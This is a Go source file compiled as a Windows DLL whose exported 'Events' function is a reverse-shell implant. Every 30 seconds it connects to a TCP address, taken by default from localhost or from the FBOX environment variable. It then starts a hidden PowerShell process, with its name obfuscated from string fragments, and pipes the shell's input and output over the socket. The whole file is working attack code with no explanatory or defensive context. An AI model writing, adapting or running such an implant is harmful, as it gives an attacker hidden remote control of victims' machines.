package main

import "C"
import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

const (
	// localhost
	host = "127.1:7333"
)

/* functions to export as a dll */

//export Events
func Events() {
	ghost := host

	if os.Getenv("FBOX") != "" {
		ghost = os.Getenv("FBOX")
	}

	dialer := net.Dialer{
		Timeout: 10 * time.Second,
	}
	for {
		time.Sleep(30 * time.Second)
		conn, err := dialer.Dial("tcp",
			ghost,
		)
		if err != nil {
			log.Println(err)
			log.Println("retrying and sleeping")
			continue
		}

		cmd := exec.Command(strings.ToLower(
			fmt.Sprintf(
				"%s%s%s%s", "pO", "wEr", "She", "LL.exE"),
		))

		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}

		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		if err := cmd.Run(); err != nil {
			log.Println(err)
		}

	}
}

func main() {}
